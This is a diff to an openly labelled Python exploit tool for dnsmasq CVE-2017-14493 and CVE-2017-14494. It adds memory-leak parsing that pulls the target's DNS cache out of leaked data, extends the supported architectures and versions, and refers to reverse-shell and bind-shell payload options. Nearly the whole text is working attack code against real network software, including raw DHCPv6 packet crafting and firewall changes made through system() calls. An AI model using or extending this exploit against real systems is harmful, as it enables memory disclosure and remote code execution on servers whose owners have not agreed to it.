@@ -5,7 +5,7 @@ from argparse import ArgumentParser
 from sys import exit
 from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
 from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
-from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, AF_PACKET, SOCK_RAW, inet_pton
+from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, AF_PACKET, SOCK_RAW, inet_pton, inet_ntoa
 from random import randint
 from netaddr import EUI
 from tm import ThreadManager
@@ -13,6 +13,7 @@ from time import sleep
 from binascii import unhexlify
 from ipaddress import IPv6Address
 from os import stat, system
+from re import compile, search
 from select import select
 from network import IPv6_raw, DHCPv6_raw
 
@@ -326,11 +327,12 @@ parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 and CVE-
 parser.add_argument('-i', '--interface', help='Set interface name for send packets')
 parser.add_argument('-e', '--exploit', action='store_true', help='Exploit (CVE-2017-14493) works only if ' +
                                                                  'Stack cookie and PIE disabled')
-parser.add_argument('-l', '--info_leak', action='store_true', help='Information leakage (CVE-2017-14494)')
+parser.add_argument('-l', '--data_leak', action='store_true', help='Data leakage (CVE-2017-14494)')
+parser.add_argument('-f', '--file_name', type=str, help='Set file name for leak data', default="response.bin")
 parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
 parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
-parser.add_argument('-a', '--architecture', help='Set architecture (i386 or amd64), default=i386', default='i386')
-parser.add_argument('-v', '--version', help='Set dnsmasq version (2.73, 2.74, 2.75, 2.76, 2.77),' +
+parser.add_argument('-a', '--architecture', help='Set architecture (i386, amd64 or arm), default=i386', default='i386')
+parser.add_argument('-v', '--version', help='Set dnsmasq version (2.70, 2.71, 2.72, 2.73, 2.74, 2.75, 2.76, 2.77),' +
                                             ' default=2.77', default='2.77')
 
 parser.add_argument('--interpreter', type=str, help='Set path to interpreter on target, ' +
@@ -462,6 +464,9 @@ else:
         print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \
               "reverse_php, reverse_nc, reverse_nce!"
         exit(1)
+
+# Dnsmasq cache
+dns_cache = {}
 
 
 def get_dhcpv6_server_duid():
@@ -742,11 +747,11 @@ def inner_pkg(duid):
     ])
 
 
-def info_leak():
+def data_leak():
     # Add iptables rules to DROP icmp packets
     system("ip6tables -A OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
-    # Receive info leak reply
+    # Receive data leak reply
     sock = socket(AF_INET6, SOCK_DGRAM)
     sock.setsockopt(SOL_SOCKET, SO_RCVBUF, LEAK_BYTES)
     sock.bind(('::', 547))
@@ -774,36 +779,72 @@ def info_leak():
         SOCK = socket(AF_PACKET, SOCK_RAW)
         SOCK.bind((current_network_interface, 0))
         SOCK.send(pkt)
-        print Base.c_info + "Send info leak request to: [" + host + "]:547"
+        print Base.c_info + "Send data leak request to: [" + host + "]:547"
         SOCK.close()
     except:
-        print Base.c_error + "Do not send info leak request."
+        print Base.c_error + "Do not send data leak request."
         exit(1)
 
-    with open('response.bin', 'wb') as response_file:
+    with open(args.file_name, 'wb') as response_file:
         sock.setblocking(0)
-        ready = select([sock], [], [], 15)
+        ready = select([sock], [], [], 30)
         if ready[0]:
             response_file.write(sock.recvfrom(LEAK_BYTES)[0])
         else:
             # Delete iptables rules to DROP icmp packets
             system("ip6tables -D OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
-            print Base.c_error + "Can not receive info leak response!"
+            print Base.c_error + "Can not receive data leak response!"
             sock.close()
             exit(1)
 
-    info_leak_size = stat('response.bin').st_size
-    if info_leak_size == LEAK_BYTES:
-        print Base.c_success + "Length info leak response: " + str(hex(info_leak_size))
+    data_leak_size = stat(args.file_name).st_size
+    if data_leak_size == LEAK_BYTES:
+        print Base.c_success + "Length data leak response: " + str(hex(data_leak_size))
+        analyze_leak_data()
     else:
-        print Base.c_error + "Bad length of info leak response: " + str(hex(info_leak_size))
+        print Base.c_error + "Bad length of data leak response: " + str(hex(data_leak_size))
 
     # Delete iptables rules to DROP icmp packets
     system("ip6tables -D OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
-    print Base.c_info + "Dump info leak response to file: response.bin"
+    print Base.c_info + "Dump data leak response to file: " + args.file_name
     sock.close()
+
+
+def analyze_leak_data():
+    f = open(args.file_name, 'rb')
+    data = f.read()
+    f.close()
+
+    dns_cache_offset = 0x1DA0
+    data = data[dns_cache_offset:]
+
+    domain_offset = search(r'(\.com|\.org|\.net|\.ru)', data)
+    if domain_offset is not None:
+        index = 1
+        while data[domain_offset.start()-index] != '\x00':
+            index += 1
+
+        pattern = data[domain_offset.start()-index-23:domain_offset.start()-index-18]
+
+        regex = compile(pattern)
+
+        for match_obj in regex.finditer(data):
+            offset = match_obj.start()
+            ipv4 = data[offset-4:offset]
+            domain = data[offset+24:data[offset+25:].find("\x00")+offset+25]
+            if "." in str(domain):
+                offset += 24 + dns_cache_offset
+                dns_cache[offset] = {"addr": str(inet_ntoa(ipv4)), "name": str(domain)}
+
+        if len(dns_cache) > 0:
+            print Base.c_success + "Leak DNS cache: "
+            for offset in dns_cache.keys():
+                print Base.c_info + "offset: " + hex(offset) + " - " \
+                      + dns_cache[offset]["name"] + ": " + dns_cache[offset]["addr"]
+        else:
+            print Base.c_error + "Do not find DNS cache in leak data!"
 
 
 def exploit():
@@ -992,6 +1033,6 @@ if __name__ == '__main__':
 
         exploit()
 
-    if args.info_leak:
+    if args.data_leak:
         if get_dhcpv6_server_duid():
-            info_leak()
+            data_leak()
